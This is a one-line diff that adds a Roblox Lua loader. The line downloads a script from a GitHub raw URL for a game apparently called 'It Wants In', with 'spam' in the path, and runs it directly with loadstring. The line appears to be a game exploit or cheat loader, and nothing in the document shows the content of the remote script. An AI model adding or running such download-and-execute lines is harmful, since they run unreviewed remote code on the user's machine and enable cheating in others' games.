@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/it-wants-in-horror-spam2-a2en16l5joed5h.lua"))()
